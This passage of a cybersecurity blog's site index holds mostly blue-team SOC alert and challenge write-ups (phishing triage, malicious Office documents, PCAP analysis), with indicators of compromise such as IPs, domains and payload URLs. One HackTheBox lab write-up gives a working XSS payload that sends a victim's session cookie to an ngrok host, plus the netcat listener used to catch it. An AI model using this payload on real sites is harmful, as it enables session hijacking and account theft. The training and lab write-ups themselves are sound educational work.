from experience that logs like that mean it allowed it through.\u0026rdquo;\nIndicators of Compromise (IOCs) # Thoughts: # \u0026ldquo;Due to us being unable to get a copy of the phishing page or malware sample, the only indicator we have is the connection log. Which in this organization is enough for containment.\u0026rdquo;\nEndpoint Analysis # Key Value File Execution: Unknown - missing data from EDR agent File Quarentined: No Infection Status: Possibly Infected EDR Status: Anomalous - missing data Thoughts: # \u0026ldquo;In this organization, if a machine has the possibility of being infected we are supposed to initiate containment. Do remember that not all organizations are like this.\u0026rdquo;\nDetermination # Verdict: # True Positive Escalate Case Reasoning: # The endpoint contacted out to the malicious URL without being stopped Execution of malware is unknown (Missing Logs) The EDR Agent is acting anomalous (Missing Logs) Actions: # Initiate endpoint containment Playbook # Questions: # Question Answer Analyze URL Address Malicious Has Anyone Accessed IP/URL/Domain? Accessed Containment Initiated Artifacts: # Value Comment Type 91.189.114.8 Phishing IP IP Address http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io Phishing Address URL Address Notes: # Verdict: True Positive. Containment Initiated. Escalating. Summary: Endpoint reached out to a malicious domain that was alerted on as phishing. No logs for quarantine. EDR Agent missing relevant logs. Containment initiated. Validated via: threat intel, log management, endpoint security. Actions taken: Containment Initiated.\nLessons Learned # \u0026ldquo;Moving without information isn\u0026rsquo;t optimal. I\u0026rsquo;m surprised the EDR agent hadn\u0026rsquo;t had updated logs all this time, and no alerts had set off. I\u0026rsquo;m also surprised the proxy didn\u0026rsquo;t grab at least a snapshot of the phishing page. If this was a real situation, I\u0026rsquo;d ask people.\u0026rdquo;\n","date":"February 20 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/141_86/","section":"Writeups","summary":"Investigating a phishing URL alert after an endpoint connected to a malicious domain, validating reputation across multiple threat intelligence sources, identifying anomalous EDR logging, and initiating containment due to potential compromise.","title":"(Writeup) LetsDefend EventID: 86 - [SOC141 - Phishing URL Detected]","type":"writeups"},{"content":"","date":"February 20 2026","externalUrl":null,"permalink":"/tags/browserling/","section":"Tags","summary":"","title":"Browserling","type":"tags"},{"content":"","date":"February 20 2026","externalUrl":null,"permalink":"/tags/type_proxy/","section":"Tags","summary":"","title":"Type_Proxy","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving an Exchange alert. Alert Details # Key Value EventID: 82 Event Time: Mar, 21, 2021, 12:26 PM Rule: SOC140 - Phishing Mail Detected - Suspicious Task Scheduler Severity Level: Security Analyst SMTP Address: 189.162.189.159 Source Address: aaronluo@cmail.carleton.ca Destination Address: mark@letsdefend.io E-mail Subject: COVID19 Vaccine Device Action: Blocked Initial Triage # Actions: # Copied alert details to notes Created case Began threat intelligence analysis Thoughts: # \u0026ldquo;Luckily it was blocked. Now to see if it was a false positive, and/or if anything else slipped through.\u0026rdquo;\nThreat Intelligence Analysis # Tools Used: # VirusTotal Talos Intelligence AbuseIPDB Hybrid-Analysis SMTP IP: # Key Value VirusTotal: Green (Low Community Score) Talos Intelligence: Neutral AbuseIPDB: 204 Reports (SSH Brute-Force) Thoughts: # \u0026ldquo;Once again reinforcing why many sources of information in important.\u0026rdquo;\nEmail: # From: aaronluo@cmail.carleton.ca To: mark@letsdefend.io Subject: COVID19 Vaccine Date: Mar, 21, 2021, 12:26 PM Action: Blocked Hey, did you read breaking news about Covid-19. Open it now! password: infected Attachments 72c812cf21909a48eb9cceb9e04b865d\nEmail Attachment: # Key Value VirusTotal: 25/63 security vendors flagged this file as malicious Hybrid Analysis: Threat Score: 100/100 Thoughts: # \u0026ldquo;The sender password protected the attachment, probably to try and bypass malware scans. Also, no reliable C2 address in the sandbox analysis.\u0026rdquo;\nFindings: # Key Value Reputation Results: malicious Sandbox Consensus: malicious Malware Family: trojan.fraud Confidence Level: high Thoughts: # \u0026ldquo;True Positive; good thing it was blocked.\u0026rdquo;\nDetermination # Verdict: # True Positive. Close Case. Reasoning: # The email was indeed phishing with malware attached. The email was blocked. Playbook # Questions: # Question Answer Are there attachments or URLs in the email? Yes Analyze Url/Attachment Malicious Check If Mail Delivered to User? Not Delivered Artifacts: # Value Comment Type 189.162.189.159 IP of Phishing SMTP IP Address aaronluo@cmail.carleton.ca Phisher E-mail Sender cmail.carleton.ca Phishing Domain E-mail Domain 72c812cf21909a48eb9cceb9e04b865d Malicious PDF MD5 Hash 957774f297ae3c13d233bb0ba2dfc352 Malicious Zip MD5 Hash Notes: # Verdict: True Positive. Blocked. Summary: Verified as phishing email, with malicious attachment. Email was blocked before delivery. Validated via: threat intel, sandbox, email security, log management, endpoint security. Actions taken: None.\nLessons Learned # \u0026ldquo;A lot of my time is used on doing Threat Intelligence Validation. It\u0026rsquo;d be nice if we could use the SOAR to automate the lookup of the data from the different threat intelligence channels automatically. Since that is unlikely, I\u0026rsquo;ll have to design a little local webpage to do that.\u0026rdquo;\n","date":"February 20 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/140_82/","section":"Writeups","summary":"Investigating a blocked phishing email with a malicious password-protected attachment, validating indicators through VirusTotal, Talos Intelligence, AbuseIPDB, and Hybrid Analysis, and confirming a true positive without endpoint impact.","title":"(Writeup) LetsDefend EventID: 82 - [SOC140 - Phishing Mail Detected - Suspicious Task Scheduler]","type":"writeups"},{"content":"","date":"February 20 2026","externalUrl":null,"permalink":"/tags/type_exchange/","section":"Tags","summary":"","title":"Type_Exchange","type":"tags"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Internal email, huh. Let\u0026rsquo;s copy the alert details into our notes, get the case \u0026amp; playbook started!\nPlaybook: # Investigating the Email: # Alright, let\u0026rsquo;s check the email out.\nFiltering for john@letsdefend.io gives us a single email to investigate.\nUh\u0026hellip; basic message asking for a meeting today. No attachment. No phishing. False positive.\nYeah, we know all this information. It\u0026rsquo;s all in the alert details, and from what we just investigated.\nIs there any URLs or attachments? No.\nCleaning Up: # Analyst Note: \u0026ldquo;False Positive on internal email between john@letsdefend.io and susie@letsdefend.io, no attachments, simple message.\u0026rdquo;\nFinish playbook!\nAlert note: \u0026ldquo;False Positive. Internal email between coworkers. No attachment or phishing intent in the email body.\u0026rdquo;\nResults: # Hope this helps!\n","date":"February 16 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/120_52/","section":"Writeups","summary":"Investigating an internal phishing detection, reviewing email details, validating absence of attachments or malicious content, and determining a false positive.","title":"(Writeup) LetsDefend EventID: 52 - [SOC120 - Phishing Mail Detected - Internal to Internal]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Let\u0026rsquo;s copy the alert details into our notes and create the case.\nBefore we start the playbook, let\u0026rsquo;s throw the SMTP Address into Talos Intelligence Center to see if it\u0026rsquo;s labeled as a malicious domain.\nNo information.\nPlaybook: # We are missing the determination of its suspiciousness and whether there are attachments; let\u0026rsquo;s get the information from Email Security.\nInvestigating Email: # Throwing in the source email address filters down to the email we are looking for.\nIt does indeed contain an attachment. I would say this is suspicious, but let\u0026rsquo;s investigate the attached file just in case.\nUploading Malware to VirusTotal: # After unzipping it and uploading to VirusTotal, we have our answer. It is indeed malicious. We can continue with the playbook now.\nYes, we know all this information now!\nYes, attachments!\nThey are indeed malicious!\nAccording to the alert details, it was delivered!\n\u0026ldquo;You got it, boss.\u0026rdquo; Momentarily back to Email Security.\nTrash can button -\u0026gt; Delete.\nDeleted!\nInvestigating Logs for C2 Connections: # Let\u0026rsquo;s find the C2 addresses on VirusTotal\u0026rsquo;s \u0026ldquo;BEHAVIOR\u0026rdquo; tab inside the file report.\nWhen multiple sandboxes agree, you usually get the correct C2 addresses.\nUsed the filter URL and found that: Yes, the computer did connect to the C2 server. It ran the malware and got infected. Looks like we\u0026rsquo;ll need to initiate containment on that endpoint.\nThe malware was indeed run.\nContaining Infected Endpoint: # Containment on the way!\nSearched for the endpoint based on which machine reached out to the C2 servers. Containment initiated!\nFinishing Up: # Added the IP of the SMTP server from which we received the phishing email. If we had more artifact locations, I\u0026rsquo;d add the phishing address and malware hashes, too.\nQuick analyst note: \u0026ldquo;Phishing was received and run by the end user. C2 traffic exists in logs. The email has been deleted, and the endpoint containment was initiated.\u0026rdquo;\nPlaybook finish!\nAlert finish; with note: \u0026ldquo;Phishing was received and run. Malware. True Positive. Email deleted. Endpoint containment initiated.\u0026rdquo;\nResults: # Hope this helps!\n","date":"February 16 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/114_45/","section":"Writeups","summary":"Investigating a malicious email attachment, validating malware in VirusTotal, identifying C2 communication in logs, deleting the phishing email, and initiating endpoint containment.","title":"(Writeup) LetsDefend EventID: 45 - [SOC114 - Malicious Attachment Detected - Phishing Alert]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Device Action: Allowed. Let\u0026rsquo;s hope it isn\u0026rsquo;t phishing! Let\u0026rsquo;s copy the alert details into our notes, then create the case!\nLet\u0026rsquo;s throw the SMTP Address into Talos Intelligence real quick.\nTalos Intelligence: # While not outright malicious, it doesn\u0026rsquo;t inspire confidence.\nLet\u0026rsquo;s get going with the playbook.\nPlaybook: # Well, have the first four from the alert details. Let\u0026rsquo;s check out the Email Security section to find out the last two.\nEmail Security: # A quick filter on the source address gave us the email.\nWell, I guess we have to examine the attachments.\nAfter unzipping the two layers of the zip archive, we have the .xls file. (If I\u0026rsquo;m correct, the reason the DLLs are included is that the domains they are supposed to be downloaded from have been removed. ) Throwing the research-1646684671.xls file into VirusTotal.\nVirusTotal: # Malicious, well, at least it saves us the step of doing dynamic analysis ourselves.\nWe are aware of the email; it is indeed a phishing attempt with attached malware.\nYes, there are attachments!\nMalicious attachments!\nIt was delivered; the alert details said: \u0026ldquo;Device Action: Allowed\u0026rdquo;.\nQuick jump back to Email Security.\nWe\u0026rsquo;ve deleted it!\nWe can grab the C2 addresses from VirusTotal in the \u0026ldquo;BEHAVIOR\u0026rdquo; tab under \u0026ldquo;IP Traffic\u0026rdquo;:\nThe IPs where multiple sandboxes agree tend to be accurate. Let\u0026rsquo;s search for those IPs in Log Management.\nLog Management: # The second C2 IP returned logs. The request URL is a perfect match. The endpoint is infected. I imagine the next step in the playbook is to quarantine the box.\nYes, it was opened, and the endpoint is infected!\nMy gut was right, it was the next step!\nEndpoint Security: # Searching for the IP that connected to the C2, we find LarsPRD, which makes sense for lars@letsdefend.io. We initiate containment for this endpoint.\nWe contained it!\nClean Up: # If I could add more artifacts, I would. I thought it would be best to leave the IP address of the SMTP server from which we received the phishing email.\nNow, just to finish up with some notes.\nResult: # Hope this helps!\n","date":"February 16 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/146_93/","section":"Writeups","summary":"Investigating a malware detection alert, analyzing a phishing email with malicious Excel attachment, validating indicators in VirusTotal, confirming C2 communication, and initiating endpoint containment.","title":"(Writeup) LetsDefend EventID: 93 - [SOC146 - Phishing Mail Detected - Excel 4.0 Macros]","type":"writeups"},{"content":"","date":"February 15 2026","externalUrl":null,"permalink":"/","section":"Policy to Packets","summary":"Cybersecurity portfolio and technical blog documenting hands-on SOC analyst training, incident investigations, HackTheBox labs, and structured security documentation by Reed Eggleston.","title":"Policy to Packets","type":"page"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Easy Description: # You must to find details of shellshock attacks Log file: /root/Desktop/ChallengeFile/shellshock.pcap Note: pcap file found public resources. Lab Start: # Wireshark: # We only need to do one thing to find the answers: Right-click the HTTP packet, then follow the HTTP Stream. What is the server operating system? # Found in the \u0026ldquo;Server: \u0026quot; in the server\u0026rsquo;s response. Ubuntu What is the application server and version running on the target system? # Once again found in \u0026ldquo;Server: \u0026ldquo;. Apache/2.2.22 What is the exact command that the attacker wants to run on the target server? # Found in the attacker\u0026rsquo;s \u0026ldquo;User-Agent: \u0026quot; after the shellshock. /bin/ping -c1 10.246.50.2 ","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/shellshock_attack/","section":"Writeups","summary":"Analyzing Shellshock attack activity in a PCAP file using Wireshark, identifying the target server details and the injected command.","title":"(Writeup) LetsDefend Challenge - Shellshock Attack","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Easy Description: # Can you determine evidences of port scan activity? Log file: /root/Desktop/ChallengeFile/port_scan.pcap Note: pcap file found public resources. Lab Start: # Wireshark: # Let\u0026rsquo;s go through each question one by one. What is the IP address scanning the environment? # Filter: tcp.flags == 0x002 If we filter just for TCP SYN packets, we quickly get the answer: 10.42.42.253 What is the IP address found as a result of the scan? # Filter: tcp.flags.ack == 1 and tcp.flags.reset == 0 and ip.addr == 10.42.42.253 If we filter only conversations involving the scanning computer where someone responded, and not with a reset, we get the answer. 10.42.42.50 What is the MAC address of the Apple system it finds? # Filter: eth.src_resolved contains Apple If we filter on source MAC addresses and only include those that resolve to Apple, we get the answer. 00:16:cb:92:6e:dc What is the IP address of the detected Windows system? # Filter: ip.dst == 10.42.42.253 and ip.ttl == 128 and tcp.flags.reset == 0 If we filter for computers talking back to the scanning computer, based on the IP packet time-to-live field being 128 (the value Windows machines tend to have), and ignore reset packets\u0026hellip; We get the answer. 10.42.42.50 ","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/port_scan_activity/","section":"Writeups","summary":"Analyzing port scan activity in a PCAP file using Wireshark, identifying the scanning host, discovered systems, and network indicators.","title":"(Writeup) LetsDefend Challenge - Port Scan Activity","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Hard Description: # 2021\u0026rsquo;s 0-Day MSHTML file location: /root/Desktop/ChallengeFiles/Employee_W2_Form.docx file location2: /root/Desktop/ChallengeFiles/Employees_Contact_Audit_Oct_2021.docx file location3: /root/Desktop/ChallengeFiles/Work_From_Home_Survey.doc file location4: /root/Desktop/ChallengeFiles/income_tax_and_benefit_return_2021.docx This challenge prepared by @Bohan Zhang Malware samples: MalwareBazaar Lab Start: # Setting up Environment: # Since we\u0026rsquo;ll be using oletools (and maybe XLMMacroDeobfuscator), let\u0026rsquo;s set up the environment.\nmkdir /tmp/analyst cp ~/Desktop/ChallengeFiles/* /tmp/analyst chown -R analyst:analyst /tmp/analyst cd /tmp/analyst su analyst pip install -U XLMMacroDeobfuscator oletools[full] export PATH=$PATH:$HOME/.local/bin # Next command is long. find ~ -path \u0026#34;*/xlrd2/formula.py\u0026#34; -exec sed -i \u0026#39;s/assert bv \u0026gt;= 80 #### this function needs updating ####/assert bv \u0026gt;= 70/\u0026#39; {} + Explanation: The LetsDefend lab runs as root. Python\u0026rsquo;s pip hates being run as root and ends up destroying packages in the process. So, we need to swap to another user. Luckily, analyst exists. We create the directory /tmp/analyst, copy all the files to it, make the folder and its content owned by analyst, switch to analyst, install the tools, and add tools to $PATH so they can be used easily. Finally, we patch xlrd2\u0026rsquo;s formula.py because it has a bug that breaks XLMMacroDeobfuscator.\nAlright, we have a working environment!\noletools # Using: oleid ./* I\u0026rsquo;ll skip you the repeating screenshots. They all essentially say the same thing: use oleobj!\nUsing: oleobj ./* Oh, that\u0026rsquo;s enough to answer the questions.\nQuestions: # Examing the Employees_Contact_Audit_Oct_2021.docx file, what is the malicious IP in the docx file? Answer: 172.24.190.249 Examing the Employee_W2_Form.docx file, what is the malicious domain in the docx file? Answer: arsenal.30cm.tw Examing the Work_From_Home_Survey.doc file, what is the malicious domain in the doc file? Answer: trendparlye.com Examing the income_tax_and_benefit_return_2021.docx, what is the malicious domain in the docx file? Answer: hidusi.com What is the vulnerability the above files exploited? Answer: CVE-2021-40444 ","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/mshtml/","section":"Writeups","summary":"Analyzing malicious Office documents exploiting MSHTML (CVE-2021-40444), using oletools to extract indicators, identify malicious domains and IPs, and investigate document-based exploitation.","title":"(Writeup) LetsDefend Challenge - MSHTML","type":"writeups"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/tags/oletools/","section":"Tags","summary":"","title":"Oletools","type":"tags"},{"content":" Welcome! (Happy Valentine\u0026rsquo;s Day!) # HackTheBox is an offensive cybersecurity-focused platform. This is a writeup for one of their challenges. Scenario: # Dating and matching can be exciting especially during Valentine\u0026rsquo;s, but it’s important to stay vigilant for impostors. Can you help identify possible frauds?\nRelease Date: Feb, 14th 2025.\nStart: # This challenge has no files; looks like it\u0026rsquo;s only an IP and Port given to us. The challenge is very easy, and the description and name stand out like a web app. Just gonna check it out in the browser.\nPfttttt- okay. Well, the login doesn\u0026rsquo;t do anything with dummy information. Let\u0026rsquo;s register.\nRegister page: Guess I\u0026rsquo;ll register a profile to see what I see.\nLooking around, there is this dashboard page and a chat page.\nOh, should check out cookies as well.\nNo Http Only flag on the cookie? Oh, is that the target? XSS, get session cookie, get flag?\nXSS # I \u0026ldquo;swiped right\u0026rdquo; on everyone on the main page and got a message. Testing:\nhello!\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; Yep, XSS. Now let\u0026rsquo;s grab their cookie\u0026hellip; (if there is one\u0026hellip;)\nShout out hacktricks. Real quick, since this is a challenge box, we need a publicly accessible IP : Port to get the data\u0026hellip;\nTime to spin up ngrok. Now we\u0026rsquo;ll set up 2 terminals. One to listen, and the second to run ngrok.\nnc -lvnp 4444 ngrok http 4444 Now, let\u0026rsquo;s alter that script and send it over. We\u0026rsquo;ll just paste the forwarding address from ngrok into the XSS script. In my case:\nSorry. \u0026lt;img src=x onerror=this.src=\u0026#34;http://e4c1-85-9-195-5.ngrok-free.app/?c=\u0026#34;+document.cookie\u0026gt; It worked! (Also caused a ton of connections over and over\u0026hellip; so I CTRL-C\u0026rsquo;d ngrok.) Let\u0026rsquo;s alter our session key and see what we get.\n(Remember to click save if using the same Firefox extension!)\nHope that helps! :)\n","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/hackthebox/challenges/onlyhacks/","section":"Writeups","summary":"Demonstrating cross-site scripting (XSS) exploitation, session cookie theft, and practical web application enumeration in a Very Easy web challenge.","title":"[Writeup] HackTheBox Labs - Challenge - OnlyHacks","type":"writeups"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/hackthebox/challenges/","section":"Writeups","summary":"HackTheBox challenge writeups focused on web exploitation, scripting, and vulnerability-based problem solving.","title":"Challenges","type":"writeups"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/categories/hackthebox/","section":"Categories","summary":"","title":"HackTheBox","type":"categories"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/hackthebox/","section":"Writeups","summary":"HackTheBox writeups covering machines, challenges, and investigative labs with structured enumeration, exploitation, and analytical breakdowns.","title":"HackTheBox","type":"writeups"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/tags/very_easy/","section":"Tags","summary":"","title":"Very_Easy","type":"tags"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Medium Description: # One of the employees has received a suspicious document attached in the email. When the e-mail flow is examined, it is seen that there is a suspicious Office file. Employees forward the email to the security team for analysis. When L1 analysts scan the suspicious file with several different scanning tools, they see that it does not contain VBA macros. Since the file format is similar to phishing, they forwarded the suspicious Office file to you for detailed analysis. ** Since the 2nd payload download addresses are closed, the 2nd payload is in the zip. Please start your analysis from the Office file. Malicious Office Document (Zip password: infected): /root/Desktop/ChallengeFiles/11f44531fb088d31307d87b01e8eabff.rar Lab Start: # Ooo, we start this lab with tools! A quick Google search shows that these tools can be installed with pip. I know (sadly, from experience) that this root shell mangles the packages installed with pip. Luckily, the lab has another user; we just gotta set up to use it.\nSetting up environment: # cd ~/Desktop/ChallengeFiles cp 11f44531fb088d31307d87b01e8eabff.rar /tmp/ cd /tmp chown analyst:analyst 11f44531fb088d31307d87b01e8eabff.rar su analyst Now we gotta set up the tools.\npip install -U XLMMacroDeobfuscator oletools[full] Ah, looks like we gotta fix that.\nexport PATH=$PATH:$HOME/.local/bin Now, let\u0026rsquo;s get to the challenge files!\nunrar x 11f44531fb088d31307d87b01e8eabff.rar It\u0026rsquo;ll ask for a password: infected then a to use the password for all files.\nresearch-1646684671.xls, iroto.dll, and iroto1.dll.\nSo, if we go back to the challenge description: The other analyst found no VBA macros, so, because of that (and the challenge\u0026rsquo;s name), we\u0026rsquo;re looking for XLM macros. Let\u0026rsquo;s run xlmdeobfuscator!\nxlmdeobfuscator -n -o 0 -f research-1646684671.xls -n - No interactivity. -o - Level of detail; 0 is maximum. -f - The file to be analyzed. Fixing bugs in tools: # \u0026hellip; anticlimactic.\nAlright, if you go into issues on the GitHub for XLMMacroDeobfuscator, we quickly find posts with the same issue, with ways to fix it. Gotta find where our formula.py is, but we have the line number!\nfind / -name \u0026#34;formula.py\u0026#34; 2\u0026gt;/dev/null It takes a little time to find the files. We\u0026rsquo;re looking for the one in the xlrd2 directory.\nnano /home/analyst/.local/lib/python3.8/site-packages/xlrd2/formula.py If we use CTRL SHIFT - AKA CTRL _ or as nano shows it ^_ we can choose what line to jump to. The kind person from the GitHub issues pages let us know the problem is on page 2451 so we\u0026rsquo;ll jump there.\nChange the 80 to 70 and then CTRL X then Y and ENTER to write the changes.\nFinally, let\u0026rsquo;s get back to that xlmdeobfuscation!\nxlmdeobfuscator -n -o 0 -f research-1646684671.xls Bingo!\nXLMMacroDeobfuscator: # Let\u0026rsquo;s put the output into a file.\nxlmdeobfuscator -n -o 0 -f research-1646684671.xls \u0026gt; analysis.txt oletools # Let\u0026rsquo;s grab some meta information for the questions real quick too.\nolemeta research-1646684671.xls We should be able to answer the questions now!\nQuestions: # For the first two questions, from the top of the XLM Deobfuscator report: Attackers use a function to make the malicious VBA macros they have prepared run when the document is opened. What do attackers change the cell name to to make Excel 4.0 macros work to provide the same functionality? First thing under \u0026ldquo;Loading Cells\u0026rdquo;! Answer: auto_open What is the address of the first cell where Excel 4.0 macros will run in the malicious Office document you are analyzing? (Example: {doc1!ab3}) Again, first thing under \u0026ldquo;Loading Cells\u0026rdquo;! (Remote single quotes and dollar signs.) Answer: Doc4!BA7 For the next three questions, from the bottom of the XLM Deobfuscator report: Which function is used to start a process in the operating system in the document you are analyzing? Answer: EXEC Which LOLBAS tool was used in the Excel 4.0 macros you analyzed? (Format: {xxxx.exe}) Answer: regsvr32.exe What is the name of the registered DLL? Answer: iroto.dll Finally, for the last question, from the olemeta report: What is the username that made the last change to the malicious document? Answer: Amanda ","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/excel_4.0_macros/","section":"Writeups","summary":"Analyzing a malicious Excel 4.0 (XLM) macro document using XLMMacroDeobfuscator and oletools to identify process execution, regsvr32 abuse, and DLL payload behavior.","title":"(Writeup) LetsDefend Challenge - Excel 4.0 Macros","type":"writeups"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/tags/xlm/","section":"Tags","summary":"","title":"XLM","type":"tags"},{"content":"","date":"February 14 2026","externalUrl":null,"permalink":"/tags/xlmmacrodeobfuscator/","section":"Tags","summary":"","title":"XLMMacroDeobfuscator","type":"tags"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Easy Description: # Analyze malicious .doc file File: /root/Desktop/ChallengeFiles/factura.zip Password: infected Lab Start: # Reminder: Don\u0026rsquo;t blindly extract zip files on machines. This is a lab, and the zip itself isn\u0026rsquo;t malicious; only the file it contains is. \u0026hellip;That being said, let\u0026rsquo;s unzip this infected zip!\ncd Desktop/ChallengeFiles/ unzip factura.zip It\u0026rsquo;ll ask for a password: infected\nUploading that file into VirusTotal, we get this: Questions: # Question 1 \u0026amp; 2, We can look at the different vendors under the \u0026ldquo;DETECTION\u0026rdquo; tab: What type of exploit is running as a result of the relevant file running on the victim machine? Answer: Rtf.Exploit What is the relevant Exploit CVE code obtained as a result of the analysis? Answer: CVE-2017-11882 Question 3, we can look under the \u0026ldquo;RELATIONS\u0026rdquo; tab: What is the name of the malicious software downloaded from the internet as a result of the file running? Answer: jan2.exe Question 4, we can find this under the the \u0026ldquo;BEHAVIOR\u0026rdquo; tab under \u0026ldquo;IP Traffic\u0026rdquo;: What is the IP address and port information it communicates with? Answer: 185.36.74.48:80 Question 5, we can find this under the \u0026ldquo;BEHAVIOR\u0026rdquo; tab: What is the exe name it drops to disk after it runs? Answer: aro.exe ","date":"February 14 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/malicious_doc/","section":"Writeups","summary":"Analyzing a malicious Word document using VirusTotal to identify RTF exploit behavior, CVE-2017-11882 abuse, payload delivery, and network communication.","title":"(Writeup) LetsDefend Challenge - Malicious Doc","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Easy Description: # Analysis XLS File File link: /root/Desktop/ChallengeFiles/ORDER_SHEET_SPEC.zip Password: infected Lab Start: # Reminder: Don\u0026rsquo;t blindly extract zip files on machines. This is a lab, and the zip itself isn\u0026rsquo;t malicious; only the file it contains is. \u0026hellip;That being said, let\u0026rsquo;s unzip this infected zip!\ncd Desktop/ChallengeFiles unzip ORDER_SHEET_SPEC.zip It\u0026rsquo;ll ask for a password: infected\nVirusTotal: # Let\u0026rsquo;s throw this in VirusTotal and see what it says! We should be able to find all the answers we need from here!\nQuestions: # Found under the \u0026ldquo;DETAILS\u0026rdquo; tab in VirusTotal. What is the date the file was created? (UTC) Answer Format: YYYY-MM-DD HH:MM:SS Answer: 2020-02-01 18:28:07 Found under the \u0026ldquo;DETECTION\u0026rdquo; tab in VirusTotal. With what name is the file detected by Bitdefender antivirus? Answer: trojan.generickd.36266294 Found under the \u0026ldquo;RELATIONS\u0026rdquo; tab in VirusTotal. How many files are dropped on the disk? Answer: 29 Found under the \u0026ldquo;RELATIONS\u0026rdquo; tab in VirusTotal; under the dropped files. You need to expand the image1.emf row to find the SHA-256 hash. What is the sha-256 hash of the file with emf extension it drops? Answer: 979dde2aed02f077c16ae53546c6df9eed40e8386d6db6fc36aee9f966d2cb82 Found under the \u0026ldquo;RELATIONS\u0026rdquo; tab in VirusTotal. What is the exact url to which the relevant file goes to download spyware? - Answer: https://multiwaretecnologia.com.br/js/podaliri4.exe ","date":"February 13 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/remote_working/","section":"Writeups","summary":"Analyzing a malicious XLS file using VirusTotal to identify detection signatures, dropped files, spyware download URLs, and file intelligence indicators.","title":"(Writeup) LetsDefend Challenge - Remote Working","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Easy Description: # One of the employees has received a suspicious document attached in the invoice email. They sent you the file to investigate. You managed to extract some strings from the VBA Macro document. Can you refer to CyberChef and decode the suspicious strings? Please, open the document in Notepad++ for security reasons unless you are running the file in an isolated sandbox. Malicious Macro: /root/Desktop/ChallengeFiles/invoice.vb This challenge prepared by @RussianPanda Lab Start: # Just the ChallengeFiles directory on the desktop, no tools.\nThe vb file is ASCII, so let\u0026rsquo;s give it a quick look in less.\nIt\u0026rsquo;s obfuscated. Those strings are obviously hex, though.\ngrep -oP \u0026#39;\u0026#34;(.*?)\u0026#34;\u0026#39; invoice.vb | while read -r line; do echo ; echo $line | xxd -r -p ; done grep - (o)nly print the characters that match the (P)erl regex from invoice.vb while - each line gets piped in: print a blank line, and pipe the line to xxd. xxd - (r)everse from hex into ascii and (p)rint the output. A little clean up in nano.\nQuestions: # The document initiates the download of a payload after the execution, can you tell what website is hosting it? Answer: https://tinyurl.com/g2z2gh6f What is the filename of the payload (include the extension)? Answer: dropped.exe What method is it using to establish an HTTP connection between files on the malicious web server? Answer: MSXML2.ServerXMLHTTP What user-agent string is it using? Answer: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) What object does the attacker use to be able to read or write text and binary files? Answer: ADODB.Stream What is the object the attacker uses for WMI execution? Possibly they are using this to hide the suspicious application running in the background. Answer: winmgmts:\\\\.\\root\\cimv2:win32_process ","date":"February 13 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/malicious_vba/","section":"Writeups","summary":"Analyzing a malicious VBA macro document, decoding obfuscated hex strings, identifying payload delivery, and investigating HTTP communication and WMI execution techniques.","title":"(Writeup) LetsDefend Challenge - Malicious VBA","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is a challenge on LetsDefend. Challenge Details: # Role targeted: Security Analyst Skill Level: Beginner Description: # Your organization has detected a ransomware infection on one of its critical systems, and it is imperative that you address this issue immediately. This type of malware searches for valuable files, such as sensitive documents and configuration files, and encrypts them using a strong encryption algorithm. The investigation has revealed that the ransomware may have used the Windows utility bitsadmin.exe to download additional malicious payloads or communicate with its command-and-control (C2) server. Your task is to carefully review the Sigma rule, answer the related questions, and understand how different rule sections (selection, condition, fields, tags, logsource) work together to detect malicious activity. File Location: C:\\Users\\LetsDefend\\Desktop\\ChallengeFile\\proc_creation_win_bitsadmin_download.yml Lab Start: # We were already given the file location. As soon as the VM opens, we 